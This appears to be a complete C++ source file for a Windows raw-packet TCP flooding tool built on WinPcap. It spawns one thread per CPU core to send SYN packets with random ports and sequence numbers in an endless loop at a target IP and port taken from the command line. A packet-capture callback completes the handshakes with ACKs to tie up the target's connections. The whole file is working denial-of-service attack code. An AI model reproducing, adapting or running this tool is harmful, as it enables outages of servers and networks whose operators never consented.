/*

g++ -oest.exe est.cpp -Wl,-Bstatic -lwsock32  -liphlpapi -lpthreadgc2 -Wl,-Bdynamic -lwpcap

*/




#include "send.h"

#include <winsock2.h>
#include <iphlpapi.h>

#define HAVE_REMOTE
#include <pcap.h>
#include <pthread.h>

#include <set>

using namespace std;

static set<unsigned short> PORT_SET;
static set<unsigned short>::iterator  PORT_IT;

void    *fnSendPacket(void *arg);//线程运行方法
int      fnSendPacket(DEV_INFO dev,char* cDstIp,int nDstPort);
int      fnCancelSending();

struct thread_param {
    DEV_INFO*   dev;
    char*       pcDstIp;
    int*        pnDstPort;
    char*       pcBaseIp;
};
static bool             FLOODING=true;
static pthread_t*       P_THREAD_LIST;




int fnCancelSending(){
    FLOODING=false;
    fnCloseDevList();
    delete      P_THREAD_LIST;
    printf("Free global variable...\n");  
    return 0;
}




char *fnFormatIpAddr( unsigned uIpAddr, char szIp[] )  
{  
    IN_ADDR addr;  
    addr.S_un.S_addr = uIpAddr;  
    strcpy( szIp, inet_ntoa( addr ) );  
    return szIp;  
}  

void fnHandlePacketCallBack(unsigned char *param,const struct pcap_pkthdr* packet_header, const unsigned char *recvPacket)  
{  

    
    

    ETHERNET_HEADER *pEthHeader = ( ETHERNET_HEADER *)recvPacket;  
    if ( *((unsigned short *)(pEthHeader->ethernetType)) != htons(ETH_IP_V4) ) return;  //不是IP V4
  
    IP_HEADER *pIpHeader = ( IP_HEADER *)(recvPacket + sizeof(ETHERNET_HEADER) );  
    if ( pIpHeader->hiProtovolType != PROTOCOL_TCP ) return;  //不是 TCP 
  
    TCP_HEADER *pTcpHeader = ( TCP_HEADER *)(recvPacket + sizeof(ETHERNET_HEADER) + sizeof(IP_HEADER) );  
    //if ( *(unsigned short *)(pTcpHeader->dstPort) != htons(localPort) ) return ;  //不是此端口


    



    PORT_IT=PORT_SET.find(*(unsigned short *)(pTcpHeader->dstPort));
    if(PORT_IT==PORT_SET.end())return;//没有此端口

   
  

    unsigned short localPort = *(unsigned short *)pTcpHeader->dstPort;  
    int dstPort = *(int *)param; 





  
    //////////////////////////////////////////////////////////////////////  
    IP_HEADER ipHeader;  
    memset( &ipHeader, 0, sizeof ipHeader );  
    unsigned char versionAndLen = 0x04;  
    versionAndLen <<= 4;  
    versionAndLen |= sizeof ipHeader / 4; //版本 + 头长度  
  
    ipHeader.versionAndHeader = versionAndLen;  
    *(unsigned short *)ipHeader.totalLen = htons( sizeof(IP_HEADER) + sizeof(TCP_HEADER) );   
  
    ipHeader.ttl = 0xFF;  
    ipHeader.hiProtovolType = PROTOCOL_TCP;  
  
    memcpy(ipHeader.srcIpAddr, pIpHeader->dstIpAddr, sizeof(unsigned int) );  
    memcpy(ipHeader.dstIpAddr, pIpHeader->srcIpAddr, sizeof(unsigned int) );  
  
    *(unsigned short *)(ipHeader.headerCheckSum) = fnCheckSum( (unsigned short *)&ipHeader, sizeof ipHeader );  
  
    ////////////////////////////////////////////////////////////////////  
    unsigned int ack = ntohl(*(unsigned int *)(pTcpHeader->seqNumber));  
    unsigned int seq =  ntohl(*(unsigned int *)(pTcpHeader->ackNumber));  
  
    TCP_HEADER tcpHeader;  
    memset(&tcpHeader, 0, sizeof tcpHeader );  
    *(unsigned short *)tcpHeader.srcPort = htons(localPort);  
    *(unsigned short *)tcpHeader.dstPort = htons(dstPort);  
    *(unsigned int *)tcpHeader.seqNumber = htonl(seq);  
    *(unsigned int *)tcpHeader.ackNumber = htonl(ack + 1);  
    tcpHeader.headLen = 5 << 4;   
    tcpHeader.contrl = 0x01 << 4; //  
    *(unsigned short *)tcpHeader.wndSize = htons(0xFFFF);  
  
    ///////////////////////////////////////////////////////////////////  
    PSD_HEADER psdHeader;  
    memset(&psdHeader, 0x00, sizeof psdHeader);  
    psdHeader.protocol = PROTOCOL_TCP;  
    *(unsigned short *)psdHeader.tcpLen = htons(sizeof(TCP_HEADER));  
    memcpy(psdHeader.dstIpAddr, ipHeader.dstIpAddr, sizeof(unsigned int) );  
    memcpy(psdHeader.srcIpAddr, ipHeader.srcIpAddr, sizeof(unsigned int) );  
  
    byte psdPacket[1024];  
    memcpy( psdPacket, &psdHeader, sizeof psdHeader );  
    memcpy( psdPacket + sizeof psdHeader, &tcpHeader, sizeof tcpHeader );  
  
    *(unsigned short *)tcpHeader.checkSum = fnCheckSum( (unsigned short*) psdPacket, sizeof psdHeader + sizeof tcpHeader );  
  
    ETHERNET_HEADER ethHeader;  
    memset(&ethHeader, 0, sizeof ethHeader);  
    memcpy(ethHeader.dstMacAddr, pEthHeader->srcMacAddr, 6);  
    memcpy(ethHeader.srcMacAddr, pEthHeader->dstMacAddr, 6);  
    *(unsigned short *)ethHeader.ethernetType = htons(ETH_IP_V4);  
  
    byte packet[1024];  
    memset(packet, 0, sizeof packet);  
  
    memcpy(packet, &ethHeader, sizeof ethHeader);  
    memcpy(packet + sizeof ethHeader, &ipHeader, sizeof ipHeader);  
    memcpy(packet + sizeof ethHeader + sizeof ipHeader, &tcpHeader, sizeof tcpHeader);  
  
    int size = sizeof ethHeader + sizeof ipHeader + sizeof tcpHeader;  
  
    pcap_t *handle = (pcap_t*)(param+ sizeof(int));  
  
  
    char srcIp[32], dstIp[32];  
    byte ctrl = pTcpHeader->contrl & 0x3F;  
    switch ( ctrl )  
    {  
   
   /*
    case 0x01 << 1: //syn  
        break;  
    case 0x01 << 4: //ack 
        puts("收到ack"); 
        break;
    */

    case ((0x01 << 4) | (0x01 << 1)): //syn+ack  
  
        fnFormatIpAddr(*(unsigned int *)(pIpHeader->srcIpAddr), srcIp );  
        fnFormatIpAddr(*(unsigned int *)(pIpHeader->dstIpAddr), dstIp );  
        //printf("%-16s ---SYN + ACK--> %-16s\n", srcIp, dstIp );  
  
        ///////////////////////////////////////////////////////////  
  
        pcap_sendpacket(handle, packet, size );  
        
        fnFormatIpAddr(*(unsigned int *)ipHeader.srcIpAddr, srcIp );  
        fnFormatIpAddr(*(unsigned int *)ipHeader.dstIpAddr, dstIp );  
        printf("%-16s ------ACK-----> %-16s:%d\n", srcIp, dstIp,dstPort );  
  
        //Sleep(10);  

       
        PORT_SET.erase (PORT_IT);  

        break;        
    default:  
        IP_HEADER *pIpHeader = (IP_HEADER *)(recvPacket + sizeof(ETHERNET_HEADER) );  
        unsigned short ipHeaderLen = pIpHeader->versionAndHeader & 0x0F;  
        ipHeaderLen *= 4;  
        TCP_HEADER *pTcpHeader = (TCP_HEADER *)(recvPacket + sizeof(ETHERNET_HEADER)  + ipHeaderLen );  
  
        int tcpHeaderLen = pTcpHeader->headLen >> 0x04;  
        tcpHeaderLen *= 4;  
        char *str = ( char *)(recvPacket + sizeof(ETHERNET_HEADER) + ipHeaderLen + tcpHeaderLen );  
        printf("res:%s\n",str);  
    }  

    
    return;  
}  





void *fnSendPacket(void *arg){


    

    struct thread_param *pParamData;
    pParamData = (struct thread_param *) arg;

    DEV_INFO* dev=pParamData->dev;
    pcap_t* pHandle=dev->handle;
    
    char*           pcDstIpAddr =pParamData->pcDstIp;
    int*            pnDstPort   =pParamData->pnDstPort;
    char*           pcSrcIpAddr =dev->szDevIP;



    byte packet[1024];
    int size = fnEncodePacket( packet, dev->szDevIP,0, pcDstIpAddr,*pnDstPort,dev->szDevMac,dev->szDevGatewayMac);

    ETHERNET_HEADER     *pEtherentHeader = (ETHERNET_HEADER *)packet;
    IP_HEADER           *pIpHeader = ( IP_HEADER *)(packet + sizeof(ETHERNET_HEADER));
    TCP_HEADER          *pTcpHeader = ( TCP_HEADER *)(packet + sizeof(ETHERNET_HEADER) + sizeof(IP_HEADER));

    byte psdPacket[128];
    memset(psdPacket, 0x00, sizeof psdPacket );
    PSD_HEADER *pPsdHeader = (PSD_HEADER *)psdPacket;

    *(unsigned int *)(pPsdHeader->dstIpAddr) = inet_addr(pcDstIpAddr);
    *(unsigned short *)(pPsdHeader->tcpLen)  = htons(sizeof(TCP_HEADER));   
    pPsdHeader->protocol = 0x06;
    pPsdHeader->padding  = 0x00;

    memcpy( psdPacket + sizeof(PSD_HEADER), pTcpHeader, sizeof(TCP_HEADER));


     



    unsigned short      nSrcPort    =  rand() %0xFFFFFFFF;
    unsigned int        unSrcIpAddr =  inet_addr(pcSrcIpAddr);
    unsigned int        unSeq = 0;

      




    
    printf("\nBegin Flooding !\n");
    while ( FLOODING )
    //for(int l=0;l<30;l++)
    {
        

        unSeq = rand() % 0xFFFFFF;
        nSrcPort = rand() % 0xFFFF;
        
        
        
        *(unsigned int *)(pIpHeader->srcIpAddr) = unSrcIpAddr;
        *(unsigned short *)(pIpHeader->headerCheckSum) = 0x0000;
        *(unsigned short *)(pIpHeader->headerCheckSum) = fnCheckSum( ( unsigned short * )pIpHeader, sizeof (IP_HEADER));
        
        *(unsigned int *)(pPsdHeader->srcIpAddr) = unSrcIpAddr;
        *(unsigned int *)(pPsdHeader->srcIpAddr) = unSrcIpAddr;

        TCP_HEADER *pPsdTcpHeader = (TCP_HEADER *)(psdPacket + sizeof(PSD_HEADER) );

        *(unsigned int *)(pPsdTcpHeader->seqNumber) = htonl(unSeq);
        *(unsigned int *)(pTcpHeader->seqNumber) = htonl(unSeq);//htonl(rand() % 0xFFFFFF );

        *(unsigned short *)(pTcpHeader->srcPort) = htons(nSrcPort);
        *(unsigned short *)(pPsdTcpHeader->srcPort) = htons(nSrcPort);

        *(unsigned short *)(pTcpHeader->checkSum) = 0x0000;
        *(unsigned short *)(pTcpHeader->checkSum) = fnCheckSum( (unsigned short *)psdPacket, sizeof(PSD_HEADER) + sizeof(TCP_HEADER) );

        //system("pause");
        
        pcap_sendpacket(pHandle, packet, size );

        
        PORT_SET.insert(nSrcPort);
        //printf("insert:%d\n", nSrcPort);

    }




    if(!FLOODING){
    
        delete      pPsdHeader;
        delete      pTcpHeader;
        delete      pIpHeader;
        delete      pEtherentHeader;
      

        printf("Free thread local variable...\n");  

    }
    
    
    return 0;
}



 


int fnSendPacket(DEV_INFO dev,char* cDstIp,int nDstPort){

   
    
    struct thread_param threadParam;
    threadParam.dev=&dev;
    threadParam.pcDstIp=cDstIp;
    threadParam.pnDstPort=&nDstPort;


    //fnSendPacket((void*)&param);

     
    int nCPUNum=fnGetCPUNum();
    P_THREAD_LIST=new pthread_t[nCPUNum];

    int rc;
    for(int i=0; i < nCPUNum; i++ ){
        rc = pthread_create(&P_THREAD_LIST[i], NULL,fnSendPacket, (void*)&threadParam);
        printf("Create thread succeed :%d\n",i );
        if (rc){
            printf("Error:unable to create thread :%d\n",i );
            exit(-1);
        }
    }

  

    byte loopParam[1024];  
    memset(loopParam, 0x00, sizeof loopParam );  
    memcpy(loopParam, &nDstPort, sizeof nDstPort );  
    memcpy(loopParam + sizeof nDstPort, dev.handle, 512 );  
    pcap_loop( dev.handle, -1, fnHandlePacketCallBack, loopParam );  

    //int nCPUNum=(sizeof(P_THREAD_LIST) / sizeof(P_THREAD_LIST[0]) - 1);
    for(int i=0; i < nCPUNum; i++ ){
        pthread_join(P_THREAD_LIST[i],NULL);
    }

    
    return 0;
}




int main(int argc, char* argv[]){



    printf("***********************************************************\n");

    printf("Use:\n");

    printf("ecs target_ip target_port  src_base_ip\n");

    printf("***********************************************************\n");
    


    int nDevsNum=fnGetAllDevs(DEV_LIST);

    for ( int i = 0; i < nDevsNum; ++i )  
    {  
        //printf("----------------------------------\n"); 
        printf("%d:\n",i);
        DEV_INFO d=DEV_LIST[i];
        printf("Name:%s\n", d.szDevName);
        printf("Description:%s\n", d.szDevDescription);
        printf("IP:%s\n", d.szDevIP);

        printf("----------------------------------\n"); 

    }  


    DEV_INFO dev=DEV_LIST[0];    


    char szError[PCAP_ERRBUF_SIZE];
    pcap_t *pHandle = pcap_open_live(dev.szDevName, 65536, 0, 1000, szError );
    if( NULL == pHandle )
    {
            printf("Error:Open adapter failed!\nPress any key to exit...");
            return -1;
    }
    fnGetGateway(dev.szDevIP,dev.szDevGatewayIP);
    
    memset(dev.szDevGatewayMac, 0, sizeof dev.szDevGatewayMac);
    fnGetGatewayMacAddr(pHandle,dev.szDevIP,dev.szDevGatewayIP,dev.szDevGatewayMac);

    memset(dev.szDevMac, 0, sizeof dev.szDevMac);
    fnGetSelfMacAddr(dev.szDevMac); 

    dev.handle=pHandle; 
   
    
    printf("\n");
    printf("Select:--->\n");
    printf("Name:%s\n", dev.szDevName);
    printf("Description:%s\n", dev.szDevDescription);
    printf("IP:%s\n", dev.szDevIP);
    printf("Mac:%02x.%02x.%02x.%02x.%02x.%02x\n",  dev.szDevMac[0],dev.szDevMac[1],dev.szDevMac[2],dev.szDevMac[3],dev.szDevMac[4],dev.szDevMac[5]);
    printf("Gateway IP:%s\n", dev.szDevGatewayIP);
    printf("Gateway Mac:%02x.%02x.%02x.%02x.%02x.%02x\n",   dev.szDevGatewayMac[0],dev.szDevGatewayMac[1],dev.szDevGatewayMac[2],dev.szDevGatewayMac[3],dev.szDevGatewayMac[4],dev.szDevGatewayMac[5]);

    printf("----------------------------------\n"); 

    fnSendPacket(dev,argv[1],atoi(argv[2]));
    fnCancelSending();



}



 


